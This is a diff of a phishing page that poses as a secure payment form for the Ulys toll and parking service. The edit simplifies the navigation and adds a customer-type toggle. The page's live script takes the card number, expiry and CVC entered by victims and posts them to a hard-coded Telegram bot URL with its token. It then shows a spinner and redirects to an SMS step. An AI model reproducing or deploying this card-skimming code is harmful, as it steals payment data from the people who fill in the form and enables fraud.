@@ -53,17 +53,15 @@
       text-align: center;
       margin-bottom: 1.5rem;
     }
+
+    .header-toggle button {
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <!-- BANDEAU HAUT -->
-  <div class="top-nav">
-    <a href="#"><span>👤</span> Mon espace</a>
-    <a href="#" class="btn-primary">Devenir client</a>
-    <div class="lang">FR ▼</div>
-  </div>
 
-  <!-- NAVBAR -->
+  <!-- NAVBAR SIMPLIFIÉE -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -71,16 +69,10 @@
           <img src="assets/images/logo-ulys2.png" alt="Ulys" class="logo"/>
         </a>
         <div class="header-toggle">
-          <button class="toggle active">Particulier</button>
-          <button class="toggle">Professionnel</button>
+          <button class="toggle active" onclick="toggleUserType(this)">Particulier</button>
+          <button class="toggle" onclick="toggleUserType(this)">Professionnel</button>
         </div>
       </div>
-      <ul class="nav-links">
-        <li><a href="#">Télépéage</a></li>
-        <li><a href="#">Recharge électrique</a></li>
-        <li><a href="#">Parking</a></li>
-        <li><a href="#">Aide</a></li>
-      </ul>
     </nav>
   </div>
 
@@ -88,7 +80,6 @@
     <div class="card">
       <h1>Paiement sécurisé</h1>
 
-      <!-- Logos -->
       <div class="accepted-logos">
         <img src="assets/images/visa.png" alt="Visa">
         <img src="assets/images/Mastercard.png" alt="Mastercard">
@@ -110,7 +101,7 @@
     </div>
   </main>
 
-  <!-- Spinner overlay -->
+  <!-- Spinner -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
   </div>
@@ -120,15 +111,20 @@
   </footer>
 
   <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
-      e.preventDefault(); // Empêche la soumission immédiate
+    // Gestion du toggle Particulier / Professionnel
+    function toggleUserType(button) {
+      document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
+      button.classList.add("active");
+    }
 
-      // Récupère les infos
+    // Envoi des données et redirection
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
       const numCarte = document.getElementById('cb-num').value;
       const expiration = document.getElementById('cb-date').value;
       const cvc = document.getElementById('cb-cvc').value;
 
-      // Message Telegram
       const message = `
 💳 Nouvelle tentative de paiement :
 🔢 Carte : ${numCarte}
@@ -136,7 +132,6 @@
 🔐 CVC : ${cvc}
       `;
 
-      // Envoi à Telegram
       fetch("https://api.telegram.org/bot7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -146,7 +141,6 @@
         })
       });
 
-      // Spinner + redirection après 25s
       document.getElementById('spinnerOverlay').style.display = 'flex';
       setTimeout(() => {
         window.location.href = 'sms.html';
